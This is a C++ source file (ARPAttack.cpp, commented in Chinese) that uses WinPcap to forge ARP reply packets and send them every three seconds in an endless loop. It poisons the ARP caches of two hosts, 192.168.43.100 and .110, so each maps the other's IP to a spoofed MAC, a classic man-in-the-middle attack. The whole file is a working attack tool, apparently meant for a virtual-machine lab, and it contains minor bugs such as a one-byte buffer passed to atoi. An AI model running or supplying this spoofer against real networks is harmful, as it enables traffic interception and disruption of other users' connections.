// ARPAttack.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include "pcap.h"
#include "protocol.h"

#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

#pragma comment(lib,"wpcap.lib")
//打开虚拟网卡VM8
pcap_t *init()
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	int i = 0;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];

	/*
	显示网卡设备列表
	*/
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/*
	打印列表
	*/
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
		{
			printf("(%s)\n", d->name);
		}
		else
		{
			printf("(no description available)\n");
		}
	}

	if (i == 0)
	{
		printf("\n no interfaces found! Make sure WinPcap is installed\n");
		return 0;
	}

	printf("Enter the interface number(1-%d):", i);
	scanf("%d",&inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range\n");
		pcap_freealldevs(alldevs);
		return 0;
	}

	//跳到选择的适配器
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++)
	{
	}
	//打开设备和适配器
	if ((adhandle = pcap_open_live(d->name,
		65536,
		1,
		1000,
		errbuf)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by winPcap\n");
		//释放设备列表
		pcap_freealldevs(alldevs);
		return 0;
	}

	printf("\nlistening on %s ...\n", d->description);

	//此刻不需要任何设备列表，可以释放
	pcap_freealldevs(alldevs);
	return adhandle;
}

//把字符转成16进制数
//把输入的12字节的MAC字符串，转变为6字节的16进制MAC地址
void ChangeMacAddr(char *p, UCHAR a[])
{
	char *p1 = NULL;
	int i = 0;
	int high, low;
	char temp[1];
	for (i = 0; i < 6; i++)
	{
		p1 = p + 1;
		switch (*p1)
		{
		//计算低位的16进制
		case 'A':
			low = 10;
			break;
		case 'B':
			low = 11;
			break;
		case 'C':
			low = 12;
			break;
		case 'D':
			low = 13;
			break;
		case 'E':
			low = 14;
			break;
		case 'F':
			low = 15;
			break;
		default:
			temp[0] = *p1;
			//如果为数字就直接转变成对应的数值
			low = atoi(temp);
		}

		switch (*p)
		{
		//计算高16进制
		case 'A':
			high = 10;
			break;
		case 'B':
			high = 11;
			break;
		case 'C':
			high = 12;
			break;
		case 'D':
			high = 13;
			break;
		case 'E':
			high = 14;
			break;
		case 'F':
			high = 15;
			break;
		default:
			temp[0] = *p;
			//如果为数字就直接转变成对应的数值
			high = atoi(temp);
		}
		//指针指向下一个x（高）x（低）字符串
		p += 2;
		//求16进制值
		a[i] = high * 16 + low;
	}
}

//构建ARP包
void makeArpPacket(ARP_PACKET &ARPPacket, char * srcMac, char * srcIP, char * dstMac, char * dstIP)
{
	UCHAR MacAddr[6] = { 0 };

	//以太网头
	//目的MAC地址
	ChangeMacAddr(dstMac, ARPPacket.ehhdr.eh_dst);   
	//源MAC地址。
	ChangeMacAddr(srcMac, ARPPacket.ehhdr.eh_src);   
	//数据类型ARP请求或应答
	ARPPacket.ehhdr.eh_type = htons(EPT_ARP);        

	//ARP头 
	//硬件地址为0x0001表示以太网地址
	ARPPacket.arphdr.arp_hrd = htons(ARP_HARDWARE);  
	//协议类型字段为0x0800表示IP地址
	ARPPacket.arphdr.arp_pro = htons(EPT_IP);        
	//硬件地址长度和协议地址长度分别指出硬件地址和协议地址的长度，
	ARPPacket.arphdr.arp_hln = 6;                    
	//以字节为单位。对于以太网上IP地址的ARP请求或应答来说，它们的值分别为6和4。
	ARPPacket.arphdr.arp_pln = 4;                    
	//ARP请求值为1,ARP应答值为2,RARP请求值为3,RARP应答值为4
	ARPPacket.arphdr.arp_op = htons(ARP_REPLY);      
	//发送方 源MAC地址（欺骗的MAC地址）
	ChangeMacAddr(srcMac, ARPPacket.arphdr.arp_sha); 
	//发送方 源IP地址 （欺骗的MAC地址）
	ARPPacket.arphdr.arp_spa = inet_addr(srcIP);     
	//目标的MAC地址 
	ChangeMacAddr(dstMac, ARPPacket.arphdr.arp_tha); 
	//目标的IP地址  
	ARPPacket.arphdr.arp_tpa = inet_addr(dstIP);     
}

//发送ARP包
void sendArpPacket(pcap_t *fp, ARP_PACKET &ARPPacket)
{
	if (pcap_sendpacket(fp, (const u_char*)&ARPPacket, sizeof(ARPPacket)) != 0)
	{
		fprintf(stderr, "\nRrror sending the packet:%s\n", pcap_geterr(fp));
		return;
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	//1.初始化网络环境
	pcap_t *adhandle = init();

	//2.填充数据包
	ARP_PACKET ARPPacket_A = { 0 };
	ARP_PACKET ARPPacket_B = { 0 };

	makeArpPacket(ARPPacket_A, "123456789ABC", "192.168.43.110", "000C29B209FA", "192.168.43.100");
	makeArpPacket(ARPPacket_B, "123456789ABC", "192.168.43.100", "005056C00008", "192.168.43.110");

	while (true)
	{
		//3.发送数据包
		sendArpPacket(adhandle, ARPPacket_A);
		sendArpPacket(adhandle, ARPPacket_B);
		printf("send 0k!\n");
		Sleep(3000);
	}

	pcap_close(adhandle);
	return 0;
}

